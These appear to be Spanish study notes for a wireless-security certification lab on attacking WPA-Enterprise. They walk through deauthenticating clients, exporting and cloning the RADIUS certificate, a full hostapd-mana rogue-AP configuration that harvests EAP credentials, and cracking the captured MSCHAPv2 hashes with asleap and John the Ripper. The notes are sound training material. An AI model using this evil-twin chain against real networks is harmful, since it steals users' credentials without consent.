# Ejercicio

Cree un punto de acceso WPA Enterprise con un certificado con el nombre que desee. Conecte un cliente usando diferentes algoritmos. Experimente con diferentes dispositivos, como un teléfono inteligente, una tableta o una computadora, para ver las diferentes opciones que ofrecen en cuanto a métodos EAP y cómo reacciona hostapd.

Para cada uno de ellos, si tiene una tarjeta inalámbrica independiente, realice una captura de paquetes para ver cómo difieren en la autenticación EAP, ya que la compatibilidad con los tipos de EAP depende del sistema operativo.

## Lab setup 

Para conectar un cliente en la red WPA-Enterprise, es necesario levantar un **servidor RADIUS**

* Configuramos el Servidor RADIUS y el AP en la misma red, usaremos wlan2 como RogueAP.

```bash
# En el panel Huawei en el navegador configuramos la ip del servidor
RADIUS Server Address = 192.168.1.5 # ip de wlan1
```
> Dejamos wlan0 y wlan2 como interfaces atacantes

En este entorno de laboratorio somos la victima y el atacante al mismo tiempo. Por lo tanto debemos administrar nuestras interfaces correctamente

* NetworkManager

```bash
# wlan0 monitor para no usar airmon-ng check kill y matar el servidor RADIUS
sudo nmcli device set wlan0 managed no
# wlan1 Servidor RADIUS
sudo nmcli device set wlan1 managed yes
# wlan2 RogueAP
sudo nmcli device set wlan2 managed no
```
* Creamos el usuario: 

```bash
sudo nano /etc/freeradius/3.0/users
# Agregamos al inicio del archivo
testuser Cleartext-Password := "12345678"
```

* Configuramos el cliente:

```bash
sudo nano /etc/freeradius/3.0/clients.conf

client huawei-ap {
    ipaddr = 192.168.1.1 # ip del AP
    secret = 14B32849 # Server key pass
    shortname = HuaweiAP 
}
```
* Levantamos el servidor

```bash
sudo freeradius -X
```
* Conectamos la estacion desactivando la validacion de certificado CA

## Flow de ataque

Intercambio PEAP
```bash
wireshark Playtronics.pcap
```
1. Crear punto de acceso no autorizado
2. Generar el certificado para hostapd-mana con freeradius

### Descubrimiento 

Un AP con WPA-Enterprise figura con MGT en la columna auth

### Ataque

#### 1. Obtencion de sertificado:
Deautenticamos un cliente como en WPA-PSK y obtenemos el protoco de enlace (handshake)

```bash
# Sniff
airodump-ng -w discovery --output-format pcap --channel 11  wlan0
# deauth
aireplay-ng -0 0 -a <AP-BSSID> -c <STATION-MAC> wlan0
```
Le damos hasta obtener el handshake

#### 2. Filtramos con wireshark

```bash
# filtro
tls.handshake.certificate
```
en el panel **_Detalles del paquete_** > **_Protocolo de autenticación extensible_** > **_Seguridad de la capa de transporte_**
debemos abrir la capa de registro TLSv1: **Protocolo de protocolo de enlace: Certificado** (o similar, ya que la versión de TLS varía)
Una vez allí, debemos expandir la opción **Protocolo de protocolo de enlace: Certificado y luego Certificados (plural)**. Dentro de **Certificados**, podemos ver una o más entradas llamadas **Certificado**. Cada una estará precedida por la longitud. Para cada certificado, hacemos clic derecho y seleccionamos Exportar bytes de paquete para guardar los datos en un archivo con la extensión **.der**.

* Seleccionar el paquete TLS Handshake: **Certificate**.

* En el panel inferior expandir: **Transport Layer Security** → **Handshake Protocol**: **Certificate** → **Certificates** → seleccionar la entrada del Certificate.

* Clic derecho → **Export Packet Bytes** → guardá como **cert.der**.

**Ver con openssl**
```bash
openssl x509 -inform der -in <CERTIFICATE_FILENAME>.der -text
```
**Convertimos a .pem e inspeccionar**
```bash
# convertir DER -> PEM y mostrar info
openssl x509 -inform der -in <CERTIFICATE_FILENAME>.der -out <CERTIFICATE_FILENAME>.pem
openssl x509 -in <CERTIFICATE_FILENAME>.pem -text -noout
```
**Convertimos a .crt**
```bash
openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt
```
#### 3. Creamos certificados para servidor RADIUS.

**Modificamos**
> Ejemplos del apunte

```bash
kali@kali:~$ sudo -s
root@kali:/home/kali# cd /etc/freeradius/3.0/certs
root@kali:/etc/freeradius/3.0/certs# nano ca.cnf
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics 
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
```

```bash
root@kali:/etc/freeradius/3.0/certs# nano server.cnf
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```
**Creamos**

```bash
# 1. Primero, necesitamos regenerar dh con una clave de 2048 bits. Al instalar freeradius, se usó una clave de 1024 bits para los parámetros DH, pero si usamos este archivo DH, hostapd-mana generará un error y cancelará el inicio por ser demasiado pequeño. Para evitarlo, eliminaremos el archivo DH antes de ejecutar make
rm dh
# 2
make
# Si make no genera el dh lo generamos manualmente con:
sudo openssl dhparam -out /etc/freeradius/3.0/certs/dh 2048
```
> Si ejecutamos "make" pero los certificados ya existen, no podremos sobrescribirlos.

```bash
make destroycerts
```
4. Creamos el archivo .conf para hostapd-mana: /etc/hostapd-mana/mana.conf

```bash
# SSID of the AP
ssid=<SSID-VICTIMA>

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=<ROGUE_AP-INTERFACE>
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
Debemos crear **hostapd.eap_user**

```bash
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
**Ejecutamos hostapd-mana**
```bash
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
**Recuperamos las credenciales**
```bash
# Guarda con este que hay un flor de bugencio varela Usar JtR
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
```

```bash
# Caso del laboratorio
john --format=netntlm -w:/home/kali/Notes/OSWP/test-wordlist.txt hash.txt
john --show hash.txt  

Warning! john.conf section [list.rules:sshrules] is multiple declared.
testuser:12345678

1 password hash cracked, 0 left
```

management@offsec.com

systemctl status NetworkManagerSystem has not been booted with systemd as init system (PID 1). Can't operate.Failed to connect to bus: Host is down